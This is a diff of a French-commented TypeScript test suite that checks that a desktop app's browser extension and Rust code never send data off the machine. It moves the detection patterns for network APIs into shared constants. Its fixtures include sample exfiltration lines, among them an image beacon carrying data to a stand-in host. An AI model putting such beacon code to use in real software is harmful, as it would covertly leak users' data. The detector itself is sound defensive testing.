@@ -35,6 +35,28 @@ const CAPTEUR = 'apps/desktop/src-tauri/src';
 /** Le seul module autorisé à parler au réseau côté capteur. */
 const PORTE_RESEAU = 'transport.rs';
 
+/**
+ * Les motifs, **déclarés une fois**.
+ *
+ * Le premier jet de ce banc les écrivait dans les contrôles, puis en écrivait
+ * une COPIE dans le cas « sait dire non ». Une copie ne garde rien : une
+ * expression cassée dans le contrôle laissait le banc vert, puisque c'est
+ * l'autre exemplaire qu'on éprouvait. C'est la faute que ce dépôt passe son
+ * temps à trouver ailleurs, commise ici même — et trouvée par un audit
+ * adverse, deux heures après que je l'ai écrite.
+ */
+const MOTIF_FETCH = /\bfetch\s*\(/;
+const MOTIF_RESSOURCE_LOCALE = /chrome\.runtime\.getURL/;
+const MOTIFS_EMISSION: readonly RegExp[] = [
+  /XMLHttpRequest/,
+  /\bWebSocket\b/,
+  /sendBeacon/,
+  /new\s+Image\s*\(/,
+  /\bEventSource\b/,
+  /navigator\.connection/,
+];
+const MOTIF_CLIENT_HTTP = /\bureq::/;
+
 async function fichiers(dossier: string, ext: string): Promise<string[]> {
   const sortie: string[] = [];
   for (const e of await readdir(dossier, { withFileTypes: true })) {
@@ -53,8 +75,8 @@ describe('INVARIANT I — rien ne sort du poste', () => {
     for (const f of await fichiers(EXTENSION, '.js')) {
       const contenu = await readFile(f, 'utf8');
       for (const [i, ligne] of contenu.split('\n').entries()) {
-        if (!/\bfetch\s*\(/.test(ligne)) continue;
-        if (!/chrome\.runtime\.getURL/.test(ligne)) {
+        if (!MOTIF_FETCH.test(ligne)) continue;
+        if (!MOTIF_RESSOURCE_LOCALE.test(ligne)) {
           fautes.push(`${f}:${i + 1} — ${ligne.trim()}`);
         }
       }
@@ -65,21 +87,13 @@ describe('INVARIANT I — rien ne sort du poste', () => {
   it('l extension n a aucun autre moyen d emettre', async () => {
     // Les balises d'analyse ne passent pas par `fetch` : une image dont l'URL
     // porte la donnee suffit, et c'est la forme la plus discrete de toutes.
-    const moyens = [
-      /XMLHttpRequest/,
-      /\bWebSocket\b/,
-      /sendBeacon/,
-      /new\s+Image\s*\(/,
-      /\bEventSource\b/,
-      /navigator\.connection/,
-    ];
     const fautes: string[] = [];
     for (const f of await fichiers(EXTENSION, '.js')) {
       const contenu = await readFile(f, 'utf8');
       for (const [i, ligne] of contenu.split('\n').entries()) {
         // Les commentaires ont le droit de NOMMER ce qu'ils interdisent.
         const code = ligne.replace(/\/\/.*$/, '').replace(/^\s*\*.*$/, '');
-        for (const m of moyens) {
+        for (const m of MOTIFS_EMISSION) {
           if (m.test(code)) fautes.push(`${f}:${i + 1} — ${ligne.trim()}`);
         }
       }
@@ -97,7 +111,7 @@ describe('INVARIANT I — rien ne sort du poste', () => {
       const contenu = await readFile(f, 'utf8');
       for (const [i, ligne] of contenu.split('\n').entries()) {
         const code = ligne.replace(/\/\/.*$/, '');
-        if (/\bureq::/.test(code)) fautes.push(`${f}:${i + 1} — ${ligne.trim()}`);
+        if (MOTIF_CLIENT_HTTP.test(code)) fautes.push(`${f}:${i + 1} — ${ligne.trim()}`);
       }
     }
     expect(fautes, `usage du client HTTP hors de ${PORTE_RESEAU} :\n${fautes.join('\n')}`).toEqual(
@@ -121,21 +135,21 @@ describe('INVARIANT I — rien ne sort du poste', () => {
       "navigator.sendBeacon('/collecte', d)",
       "new Image().src = 'https://x.invalid/?d=' + d",
     ];
-    const motifs = [
-      /\bfetch\s*\(/,
-      /XMLHttpRequest/,
-      /sendBeacon/,
-      /new\s+Image\s*\(/,
-      /\bWebSocket\b/,
-    ];
+    // **Les motifs éprouvés sont CEUX des contrôles**, pas une copie. Une copie
+    // ne garde rien : une expression cassée dans le contrôle laisserait ce cas
+    // vert, puisque c'est l'autre exemplaire qu'il regarde.
+    const tous = [MOTIF_FETCH, ...MOTIFS_EMISSION];
     for (const e of emissions) {
       expect(
-        motifs.some((m) => m.test(e)),
+        tous.some((m) => m.test(e)),
         `aucun motif n attrape « ${e} »`,
       ).toBe(true);
     }
     // Et le cas legitime reste legitime.
     const local = "await fetch(chrome.runtime.getURL('motifs.json'))";
-    expect(/\bfetch\s*\(/.test(local) && /chrome\.runtime\.getURL/.test(local)).toBe(true);
+    expect(MOTIF_FETCH.test(local) && MOTIF_RESSOURCE_LOCALE.test(local)).toBe(true);
+    // Le motif du client HTTP doit mordre sur ce qu'il vise, et pas au-dela.
+    expect(MOTIF_CLIENT_HTTP.test('let a = ureq::Agent::new();')).toBe(true);
+    expect(MOTIF_CLIENT_HTTP.test('let a = requete::agent();')).toBe(false);
   });
 });
